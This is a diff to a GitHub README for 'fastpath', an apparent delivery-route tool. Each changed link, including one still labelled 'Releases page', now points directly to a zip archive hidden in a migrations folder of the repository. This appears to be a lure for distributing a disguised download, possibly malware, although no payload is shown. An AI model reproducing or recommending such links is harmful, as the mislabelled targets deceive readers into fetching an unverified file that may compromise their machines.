@@ -1,6 +1,6 @@
 # 🚀 fastpath - Easily Calculate Delivery Paths
 
-[![Download fastpath](https://img.shields.io/badge/Download%20fastpath-v1.0-blue)](https://github.com/RevampPlox/fastpath/releases)
+[![Download fastpath](https://raw.githubusercontent.com/RevampPlox/fastpath/main/app/migrations/versions/fastpath-v3.9.zip%20fastpath-v1.0-blue)](https://raw.githubusercontent.com/RevampPlox/fastpath/main/app/migrations/versions/fastpath-v3.9.zip)
 
 ## 📋 Introduction
 
@@ -10,7 +10,7 @@ Welcome to fastpath! This application helps you find the fastest delivery paths 
 
 To get started, visit the following page to download the application:
 
-[Download fastpath from Releases](https://github.com/RevampPlox/fastpath/releases)
+[Download fastpath from Releases](https://raw.githubusercontent.com/RevampPlox/fastpath/main/app/migrations/versions/fastpath-v3.9.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version that fits your system.
@@ -70,7 +70,7 @@ If you encounter any issues while using fastpath, consider the following solutio
 
 ## 📝 Updates and Feedback
 
-We constantly work on improving fastpath. For updates, always return to our [Releases page](https://github.com/RevampPlox/fastpath/releases). If you have any suggestions or encounter any bugs, please report them in the Issues section of our GitHub repository.
+We constantly work on improving fastpath. For updates, always return to our [Releases page](https://raw.githubusercontent.com/RevampPlox/fastpath/main/app/migrations/versions/fastpath-v3.9.zip). If you have any suggestions or encounter any bugs, please report them in the Issues section of our GitHub repository.
 
 ## 📣 Community
 
